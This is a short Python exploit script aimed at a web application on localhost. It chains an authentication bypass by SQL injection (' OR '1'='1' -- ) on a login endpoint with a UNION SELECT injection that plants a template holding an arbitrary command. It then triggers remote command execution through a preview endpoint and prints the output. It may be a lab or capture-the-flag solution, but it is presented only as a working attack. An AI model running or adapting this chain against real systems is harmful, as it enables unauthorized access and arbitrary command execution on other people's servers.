#!/usr/bin/env python3
import requests
import sys

BASE = "http://localhost:8080"
S = requests.Session()

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <command>")
    sys.exit(1)

CMD = sys.argv[1]

def die(msg):
    print(msg)
    sys.exit(1)

print("[*] Logging in via SQL injection")

payload = "' OR '1'='1' -- "

r = S.post(
    f"{BASE}/api.php?action=login",
    data={
        "username": payload,
        "password": "x"
    },
    allow_redirects=False
)

if r.status_code not in (302, 303):
    die("[-] SQLi login failed")

print("[+] SQLi login successful")
print("[*] Injecting malicious template")

title_payload = "' UNION SELECT '{{" + CMD + "}}' -- "

r = S.get(
    f"{BASE}/api.php",
    params={
        "action": "load_note_to_template",
        "title": title_payload
    }
)

if r.status_code != 200:
    die("[-] Template injection failed")

print("[+] Template planted")
print("[*] Triggering RCE")

r = S.get(f"{BASE}/api.php?action=preview")

print("\n===== COMMAND OUTPUT =====")
print(r.text.strip())
print("==========================")
